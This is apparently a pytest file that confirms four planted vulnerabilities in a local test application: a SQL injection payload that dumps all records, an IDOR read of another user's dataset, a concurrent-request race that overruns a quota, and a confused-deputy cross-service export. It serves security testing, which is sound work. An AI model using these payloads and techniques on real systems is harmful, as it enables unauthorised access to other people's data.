import requests
import concurrent.futures
import pytest

API_GATEWAY = "http://127.0.0.1:5001"

def login(username, password):
    res = requests.post(f"{API_GATEWAY}/api/auth/login", json={"username": username, "password": password})
    assert res.status_code == 200, f"Login failed for {username}"
    return res.json()["token"]

def test_vulnerability_1_sql_injection():
    """Verify TH-01: SQL injection bypasses query filters to dump all datasets."""
    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    # Inject OR condition to return all database rows
    payload = "' OR '1'='1"
    res = requests.get(f"{API_GATEWAY}/api/datasets/search?q={payload}", headers=headers)
    assert res.status_code == 200
    records = res.json()

    # Confirms exploitability: both dataset 1 and dataset 2 returned
    assert len(records) >= 2, "SQL injection failed to dump records"
    print("\n[+] Vulnerability 1 (SQLi) confirmed: dumped all records.")

def test_vulnerability_2_idor():
    """Verify TH-02: Alice can directly access Bob's private dataset (ID 2)."""
    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    # Alice queries Dataset 2 (owned by Bob)
    res = requests.get(f"{API_GATEWAY}/api/datasets/2", headers=headers)
    assert res.status_code == 200
    data = res.json()

    assert data["owner_id"] == 3, "IDOR failed to access Bob's data"
    print("\n[+] Vulnerability 2 (IDOR) confirmed: Alice accessed Bob's dataset.")

def test_vulnerability_3_race_condition():
    """Verify TH-03: Concurrent requests bypass quota limits (State Failure)."""
    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    # Alice starts with quota = 1. We launch 2 parallel requests to consume quota.
    def call_consume():
        return requests.post(f"{API_GATEWAY}/api/datasets/consume-quota", headers=headers)

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        f1 = executor.submit(call_consume)
        f2 = executor.submit(call_consume)
        r1 = f1.result()
        r2 = f2.result()

    # Both parallel calls succeeded despite quota being only 1
    assert r1.status_code == 200 and r2.status_code == 200
    print("\n[+] Vulnerability 3 (Race Condition) confirmed: Quota consumed concurrently beyond limit.")

def test_vulnerability_4_confused_deputy_composition():
    """Verify TH-04: Alice tricks Processing Service into exporting Bob's dataset."""
    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    # Alice requests export of Bob's dataset (ID 2)
    res = requests.post(f"{API_GATEWAY}/api/export-job", json={"dataset_id": 2}, headers=headers)
    assert res.status_code == 200
    data = res.json()

    assert data["status"] == "COMPLETED"
    assert "Atmospheric Carbon Analysis" in data["summary"]
    print("\n[+] Vulnerability 4 (Confused Deputy) confirmed: Unauthorized cross-service export succeeded.")

if __name__ == "__main__":
    pytest.main(["-s", __file__])